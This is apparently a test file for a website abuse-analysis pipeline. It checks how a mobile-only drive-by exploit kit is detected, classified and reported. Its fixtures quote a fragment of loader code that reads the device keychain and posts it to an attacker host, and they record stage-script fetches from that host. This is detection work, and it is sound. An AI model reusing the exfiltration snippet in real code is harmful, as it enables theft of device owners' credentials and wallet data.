import { describe, expect, test } from "bun:test";
import { eq } from "drizzle-orm";
import sharp from "sharp";

import type { AnalysisClient } from "./analysis_run";
import { abuseJobs } from "./abuse/schema";
import { AbuseRepository } from "./abuse/repository";
import { IPHONE_USER_AGENT } from "./browser/page";
import { getDb } from "./db";
import { ArtifactsEntity, SubmissionsEntity } from "./db/entities";
import { useTemporaryDatabase } from "./db/test_helpers";
import { readInvestigationJobPayload } from "./investigation/payload";
import { CORUNA_FRAME_URL, CORUNA_HOST, CORUNA_LOADER, CORUNA_LOOT_URL, CORUNA_LURE_TEXT } from "./malware/coruna_loader.fixture";
import { exploitLoaderSignals } from "./malware/exploit_loader";
import { websiteSubmissionDedupeKey } from "./submissions/website";
import { analyzeWebsite, buildWebsiteClassificationInput, buildWebsiteReportEvidence, reportableWebsiteHop, validateWebsiteSiteClassification, websiteMobileHandoff, websiteSiteAssessments } from "./website_ai";
import type { ArchiveWebsiteOptions, WebsiteArchiveResult } from "./website_archive";
import type { WebsiteFrameRequest, WebsiteFrameResource, WebsiteHiddenFrame, WebsiteNavigationHop } from "./website_types";

useTemporaryDatabase();

const PAGE = `${CORUNA_HOST}/`;
const DESKTOP_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36";
/** Lines of the loader the classifier quotes: they read the keychain and post it away. */
const LOADER_QUOTE = `if (typeof readKeychain === 'function') {
							var kc = readKeychain();
							fetch('${CORUNA_LOOT_URL}', {`;

const PNG = await sharp({ create: { width: 32, height: 24, channels: 3, background: "#ffffff" } })
	.composite([{ input: { create: { width: 16, height: 8, channels: 3, background: "#202124" } }, top: 8, left: 8 }])
	.png().toBuffer();

/** The loader frame as a capture records it: on a desktop it only sits there, on an iPhone it fetches its stages and posts. */
function loaderFrame(device: "desktop" | "iphone"): WebsiteHiddenFrame {
	const resources: WebsiteFrameResource[] = device === "iphone"
		? [
			{ url: `${CORUNA_HOST}/pe/0cb19f768eb8cd92.js`, type: "fetch", loadedBy: "script", status: 200, size: 5_874, sha256: "a".repeat(64) },
			{ url: `${CORUNA_HOST}/pe_main.js?v=1762531200000`, type: "script", loadedBy: "script", status: 200, size: 782_325, sha256: "b".repeat(64) },
		]
		: [];
	const sentRequests: WebsiteFrameRequest[] = device === "iphone" ? [{ url: CORUNA_LOOT_URL, method: "POST", body: '{"cmd":"bridge_status","source":"darksw bridge"}' }] : [];
	return {
		ref: "frame1",
		url: CORUNA_FRAME_URL,
		hiddenBy: "0×0 size",
		sha256: "c".repeat(64),
		size: CORUNA_LOADER.length,
		source: CORUNA_LOADER,
		resources,
		sentRequests,
		signals: exploitLoaderSignals({ frameUrl: CORUNA_FRAME_URL, code: [{ url: CORUNA_FRAME_URL, text: CORUNA_LOADER, markup: true }], resources, sentRequests }),
		userAgent: device === "iphone" ? IPHONE_USER_AGENT : DESKTOP_USER_AGENT,
	};
}

function capture(options: ArchiveWebsiteOptions): WebsiteArchiveResult {
	const device = options.device === "iphone" ? "iphone" : "desktop";
	const text = device === "iphone" ? CORUNA_LURE_TEXT.split("\n").slice(0, 4).join("\n") : CORUNA_LURE_TEXT;
	return {
		requestedUrl: options.url,
		url: options.url,
		hostname: new URL(options.url).hostname,
		navigationHops: [{ index: 0, url: options.url, hostname: new URL(options.url).hostname, status: 200, contentType: "text/html", contentCaptured: true }],
		archivedAt: new Date("2026-11-07T15:58:59Z"),
		route: "Tor exit",
		screenshotPng: PNG,
		mhtml: Buffer.from(`From: <Saved by Blink>\r\nSnapshot-Content-Location: ${options.url}\r\n\r\n<html><body>${text}</body></html>`, "utf8"),
		html: Buffer.from(`<html><body><main>${text.split("\n").map((line) => (line === "Verify" ? "<button>Verify</button>" : `<p>${line}</p>`)).join("")}</main></body></html>`, "utf8"),
		text: Buffer.from(text, "utf8"),
		hiddenFrames: [loaderFrame(device)],
		...(device === "iphone" ? { device } : {}),
	};
}

type Answer = Record<string, unknown>;
const NOTHING: Answer = { finding: "insufficient_evidence", phishingBasis: "none", evidenceQuote: "", collectionFieldRefs: [], continuationRef: "", hiddenFrameRef: "", mobileHandoff: false };

/** Answers the desktop decoy and the page the iPhone is shown, telling them apart by the device statement. */
function model(answers: { desktop: Answer; iphone: Answer }, prompts: string[] = []): AnalysisClient {
	let call = 0;
	return {
		responses: {
			create: async (options: { input: Array<{ content: unknown }>; text?: unknown }) => {
				const prompt = JSON.stringify(options.input);
				prompts.push(prompt);
				const answer = prompt.includes("it was opened again as Safari on an iPhone") ? answers.iphone : answers.desktop;
				const text = options.text ? JSON.stringify(answer) : "The page shows a fake verification; a hidden frame runs an exploit loader.";
				call++;
				return (async function* () {
					yield {
						type: "response.completed",
						response: { id: `response-${call}`, status: "completed", output: [{ type: "message", content: [{ type: "output_text", text }] }], usage: { total_tokens: 10 } },
					};
				})();
			},
		},
	} as unknown as AnalysisClient;
}

async function analyze(id: bigint, answers: { desktop: Answer; iphone: Answer }, captures: ArchiveWebsiteOptions[] = [], prompts: string[] = []) {
	await SubmissionsEntity.create({ id, kind: "website", data: { kind: "website", website: { url: PAGE } }, dedupeKey: websiteSubmissionDedupeKey(`${PAGE}#${id}`), status: "running", source: PAGE });
	await analyzeWebsite({ submissionId: id, url: PAGE }, {
		getInfo: async () => ({ ip_rdaps: [] }),
		analysisClient: model(answers, prompts),
		timestampEvidence: async () => undefined,
		browserBackoffMs: [1],
		archiveWebsite: async (options) => {
			captures.push(options);
			return capture(options);
		},
	});
	const submission = await SubmissionsEntity.get(id);
	return { submission, website: submission?.data.kind === "website" ? submission.data.website : undefined };
}

const DRIVE_BY: Answer = { ...NOTHING, finding: "malware", evidenceQuote: LOADER_QUOTE, hiddenFrameRef: " Frame1 " };

describe("a mobile-only drive-by exploit kit (production case 377486973465530391)", () => {
	test("the desktop decoy's phone hand-off is followed as an iPhone before its Verify button, and the loader in its hidden frame is reported as malware", async () => {
		const captures: ArchiveWebsiteOptions[] = [];
		const prompts: string[] = [];
		// The decoy also names its Verify button; the phone comes first.
		const { submission, website } = await analyze(377486973465530391n, { desktop: { ...NOTHING, continuationRef: "c1", mobileHandoff: true }, iphone: DRIVE_BY }, captures, prompts);

		expect(captures.map(({ url, device }) => ({ url, device }))).toEqual([{ url: PAGE, device: undefined }, { url: PAGE, device: "iphone" }]);
		expect(submission?.status).toBe("reported");
		expect(submission?.info).toBe(`Malware distribution confirmed at ${PAGE}; its evidence is being collected before the report is sent.`);
		expect(website?.device).toBe("iphone");
		expect(website?.navigationHops?.map(({ index, url, redirectTo, revisitedAs, contentCaptured }) => ({ index, url, redirectTo, revisitedAs, contentCaptured }))).toEqual([
			{ index: 0, url: PAGE, redirectTo: PAGE, revisitedAs: "iphone", contentCaptured: false },
			{ index: 1, url: PAGE, redirectTo: undefined, revisitedAs: undefined, contentCaptured: true },
		]);
		expect(website?.siteAssessments?.at(-1)).toMatchObject({ finding: "malware", hiddenFrame: { ref: "frame1", url: CORUNA_FRAME_URL } });
		expect(website?.hiddenFrames?.[0]?.userAgent).toBe(IPHONE_USER_AGENT);

		// The classifier saw the frame's source and signals, and on the phone, which device it was.
		const [desktopPrompt, iphonePrompt] = prompts;
		expect(desktopPrompt).toContain("hidden_frames");
		expect(desktopPrompt).toContain("Set mobileHandoff to true when the page turns desktop visitors away");
		expect(desktopPrompt).not.toContain("it was opened again as");
		expect(iphonePrompt).toContain("it was opened again as Safari on an iPhone (iOS 18.6.2)");
		expect(iphonePrompt).toContain("reads_platform_from_user_agent");

		// Both pages are evidence; the phone's is the analyzed step.
		const artifacts = await ArtifactsEntity.listForSubmission(submission!.id);
		expect(artifacts.map(({ name }) => name).filter((name) => name?.endsWith(".mhtml")).sort()).toEqual(["website-step2.mhtml", "website.mhtml"]);

		const report = await AbuseRepository.getReportForSubmission(submission!.id);
		expect(report?.allegationCategory).toBe("malware");
		expect(report?.description.split("\n")).toEqual([
			"The page attacks its visitors' devices without any action from them (a drive-by exploit): a frame on it that no visitor can see runs an exploit loader, and what the visitor sees is only a decoy.",
			"The page turns desktop visitors away to a phone; it was captured as Safari on an iPhone (iOS 18.6.2).",
			`Visitors reach the page through the site's own earlier pages: opening ${PAGE} on a phone (Safari on an iPhone (iOS 18.6.2)), since it turns desktop visitors away.`,
			`The hidden frame is hxxps://92haoyun[.]icu/gooll/gooll.html (hidden by 0×0 size; its document is ${CORUNA_LOADER.length} bytes, SHA-256 ${"c".repeat(64)}).`,
			"Its code reads the visitor's operating system version from the browser (iPhone OS, CPU OS) to choose what to load.",
			"Its code downloads further code and runs it.",
			"It loads these files: hxxps://92haoyun[.]icu/pe/0cb19f768eb8cd92.js, hxxps://92haoyun[.]icu/pe_main.js?v=1762531200000, hxxps://92haoyun[.]icu/native_bridge.js.",
			"It sends keychain, wallet data from the device to hxxps://92haoyun[.]icu/coruna-loot; the capture saw this request go out.",
			`Code in the hidden frame that shows it (URLs defanged): ${JSON.stringify("if (typeof readKeychain === 'function') { var kc = readKeychain(); fetch('hxxps://92haoyun[.]icu/coruna-loot', {")}.`,
		]);
		const evidence = (await AbuseRepository.getReportInput(report!.id))!.evidenceArtifacts.map(({ name }) => name);
		expect(evidence).toEqual(["website-step2.png", "website.png", `hidden-frame-${"c".repeat(16)}.json`]);

		const job = (await getDb()).select().from(abuseJobs).where(eq(abuseJobs.reportId, report!.id)).get()!;
		expect(readInvestigationJobPayload(job.payload)).toMatchObject({
			finding: { finding: "malware" },
			pasteCommands: [],
			exploitLoader: {
				frameUrl: CORUNA_FRAME_URL,
				userAgent: IPHONE_USER_AGENT,
				dataUploads: [{ url: CORUNA_LOOT_URL, data: ["keychain", "wallet"], observed: true }],
			},
		});
	});

	test("a desktop page that already shows a drive-by finding and does not hand off is reported as captured, without a phone visit", async () => {
		const captures: ArchiveWebsiteOptions[] = [];
		const { submission, website } = await analyze(377486973465530392n, { desktop: DRIVE_BY, iphone: NOTHING }, captures);
		expect(captures).toHaveLength(1);
		expect(submission?.status).toBe("reported");
		expect(website?.device).toBeUndefined();
		const report = await AbuseRepository.getReportForSubmission(submission!.id);
		expect(report?.description).not.toContain("captured as Safari");
		expect(report?.description).toContain("It sends keychain, wallet data from the device to hxxps://92haoyun[.]icu/coruna-loot.");
	});

	test("a phone that is shown nothing reportable leaves the case invalid, saying the hand-off was followed", async () => {
		const { submission, website } = await analyze(377486973465530393n, { desktop: { ...NOTHING, mobileHandoff: true }, iphone: NOTHING });
		expect(submission?.status).toBe("invalid");
		expect(website?.device).toBe("iphone");
		expect(website?.navigationHops?.[0]?.revisitedAs).toBe("iphone");
	});

	test("a page captured as a phone is never handed off again, and its links are opened as that phone", async () => {
		const captures: ArchiveWebsiteOptions[] = [];
		await analyze(377486973465530394n, { desktop: { ...NOTHING, mobileHandoff: true }, iphone: { ...NOTHING, mobileHandoff: true } }, captures);
		expect(captures.map(({ device }) => device)).toEqual([undefined, "iphone"]);
	});
});

describe("drive-by classification", () => {
	const hop: WebsiteNavigationHop = { index: 0, url: PAGE, hostname: "92haoyun.icu", status: 200, contentCaptured: true };
	const archive = capture({ url: PAGE, device: "iphone" });
	const validate = (answer: Answer) => validateWebsiteSiteClassification(answer, archive.text.toString("utf8"), archive.html.toString("utf8"), archive.hiddenFrames);

	test("a drive-by quote must be verbatim code of the frame it cites; layout and case of the ref do not matter", () => {
		expect(validate(DRIVE_BY)).toEqual({
			finding: "malware",
			evidenceQuote: "if (typeof readKeychain === 'function') { var kc = readKeychain(); fetch('https://92haoyun.icu/coruna-loot', {",
			hiddenFrame: { ref: "frame1", url: CORUNA_FRAME_URL },
		});
		expect(validate({ ...DRIVE_BY, evidenceQuote: "stealKeychain(); upload('https://92haoyun.icu/coruna-loot')" })).toEqual({
			finding: "insufficient_evidence",
			rejectedClaim: "its evidence quote does not appear verbatim in the hidden frame's source",
		});
		// Page text is no proof of what a frame does, and a frame's code is no proof of what the visitor is shown.
		expect(validate({ ...DRIVE_BY, evidenceQuote: "Security verification in progress" }).finding).toBe("insufficient_evidence");
		expect(validate({ ...DRIVE_BY, hiddenFrameRef: "frame9" })).toEqual({ finding: "insufficient_evidence", rejectedClaim: 'it cited a hidden frame the capture did not record ("frame9")' });
		expect(validate({ ...DRIVE_BY, finding: "phishing", phishingBasis: "credential_theft" })).toEqual({ finding: "insufficient_evidence", rejectedClaim: "it cited a hidden frame for a finding other than malware" });
		expect(validateWebsiteSiteClassification(DRIVE_BY, archive.text.toString("utf8"), archive.html.toString("utf8"))).toEqual({ finding: "insufficient_evidence", rejectedClaim: 'it cited a hidden frame the capture did not record (" Frame1 ")' });
		// A finding without a frame ref is still judged on the page text.
		expect(validate({ ...NOTHING, finding: "malware", evidenceQuote: LOADER_QUOTE }).finding).toBe("insufficient_evidence");
	});

	test("the classifier must say whether the page hands off to a phone", () => {
		const { mobileHandoff: _omitted, ...withoutHandoff } = NOTHING;
		expect(() => validate(withoutHandoff)).toThrow("whether the page hands visitors off to a phone");
		const { hiddenFrameRef: _ref, ...withoutRef } = NOTHING;
		expect(() => validate(withoutRef)).toThrow("hidden frame reference");
		expect(websiteMobileHandoff({ mobileHandoff: true })).toBe(true);
		expect(websiteMobileHandoff({ mobileHandoff: "yes" })).toBe(false);
	});

	test("a stored drive-by finding is reportable only while the frame it cites still holds the quote", () => {
		const classification = validate(DRIVE_BY);
		const assessments = websiteSiteAssessments([hop], 0, classification);
		expect(reportableWebsiteHop([hop], assessments, archive)).toEqual(hop);
		expect(reportableWebsiteHop([hop], assessments, { ...archive, hiddenFrames: [] })).toBeUndefined();
		expect(reportableWebsiteHop([hop], assessments, { ...archive, hiddenFrames: [{ ...loaderFrame("iphone"), source: "<html></html>" }] })).toBeUndefined();
		expect(reportableWebsiteHop([hop], assessments, { ...archive, hiddenFrames: [{ ...loaderFrame("iphone"), url: `${CORUNA_HOST}/other.html` }] })).toBeUndefined();
	});

	test("the classification input bounds each frame's source and lists what it loaded and sent", () => {
		const big = { ...loaderFrame("iphone"), source: `${CORUNA_LOADER}${"/* padding */".repeat(5_000)}` };
		const input = buildWebsiteClassificationInput(hop, { ...archive, hiddenFrames: [big, { ...big, ref: "frame2" }, { ...big, ref: "frame3" }] });
		const text = (input[1]!.content as Array<{ text?: string }>)[0]!.text!;
		expect(text).toContain("ref: frame1");
		expect(text).toContain(`${CORUNA_HOST}/pe/0cb19f768eb8cd92.js`);
		expect(text).toContain("POST");
		// 24k per frame, 48k in total: the third frame gets no source.
		expect(text.split("/* padding */").length - 1).toBeLessThan(48_000 / "/* padding */".length + 1);
		expect(text.length).toBeLessThan(80_000);
	});

	test("a loader frame gets the source budget before frames without loader signals, whatever their order on the page", () => {
		const filler = (ref: string): WebsiteHiddenFrame => ({
			...loaderFrame("desktop"),
			ref,
			url: `https://ads.example/${ref}.html`,
			source: `<html>${ref}-filler ${"x".repeat(30_000)}</html>`,
			signals: { platformGate: [], runsFetchedCode: false, stageUrls: [], dataUploads: [] },
		});
		const input = buildWebsiteClassificationInput(hop, { ...archive, hiddenFrames: [filler("frame1"), filler("frame2"), { ...loaderFrame("iphone"), ref: "frame3" }] });
		const text = (input[1]!.content as Array<{ text?: string }>)[0]!.text!;
		expect(text).toContain("var kc = readKeychain();");
		expect(text.indexOf("ref: frame3")).toBeLessThan(text.indexOf("ref: frame1"));
		// The second filler frame gets what the budget has left.
		expect(text).toContain("frame1-filler");
	});

	test("the report text of a drive-by finding fails loudly when its frame is missing", () => {
		expect(() => buildWebsiteReportEvidence(validate(DRIVE_BY), {})).toThrow("hidden frame is missing");
	});
});
